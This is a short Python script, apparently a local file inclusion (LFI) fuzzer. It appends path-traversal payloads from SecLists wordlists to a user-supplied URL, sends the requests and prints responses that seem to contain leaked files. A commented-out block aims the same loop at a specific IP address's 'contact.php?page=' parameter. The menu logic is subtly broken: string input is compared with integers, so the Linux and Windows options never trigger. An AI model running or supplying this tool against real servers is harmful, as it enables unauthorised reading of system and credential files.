import urllib3
import time

print("Welcome to LFI checker\n")
asq_url = input("Please enter the url:")
asq_file = input("[1] for nix\n"
                 "[2] for win\n"
                 "[All Other] default\n>>>")

if asq_file == 1:
    dest_file = 'LFI-gracefulsecurity-linux.txt'
elif asq_file == 2:
    dest_file = 'LFI-gracefulsecurity-windows.txt'
else:
    dest_file = 'LFI-all.txt'
# Using readlines()
txt_file = open(dest_file, 'r')
Lines = txt_file.readlines()

tries = 1
# Strips the newline character
for line in Lines:
    #print(f'{line.strip()}')
    http = urllib3.PoolManager()
    url = f'{asq_url}{line.strip()}'

    try:
        response = http.request('GET', url)
        #time.sleep(3)
        if len(response.data.decode('utf-8')) > 1 and len(response.data.decode('utf-8')) != 9618:
            print("[*] Server respond code:", response.status)
            print("[*] LFI path:", line)  # LFI Path
            print("[*] Respond data:", response.data.decode('utf-8'))  # source code to show
            print("[*] Respond data len:", len(response.data.decode('utf-8')))  # response len
            print("[*] Full URL:",url)  # encoded url
            print("============Separator=============")
    except:
        pass
    print(f"\rTries string:{tries}", end="")
    time.sleep(0.1)
    tries += 1



















# LFI file: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
'''with open('LFI-nix-path.txt') as file:
    while line := file.readline().rstrip():  # print(num := 15) the walrus operator
        print(line)
        message = f'{line}'
        http = urllib3.PoolManager()
        url = f'http://18.158.46.251:6477/contact.php?page={message}'
        #print(url)

        response = http.request('GET', url)
        #if len(response.data.decode('utf-8')) > 4 and len(response.data.decode('utf-8')) !=12: # 4 = empty 12 = sig error
        print(response.status)
        print(line) # LFI Path
        print(response.data.decode('utf-8')) # source code to show
        print(len(response.data.decode('utf-8'))) # response len
        print(url) # encoded url'''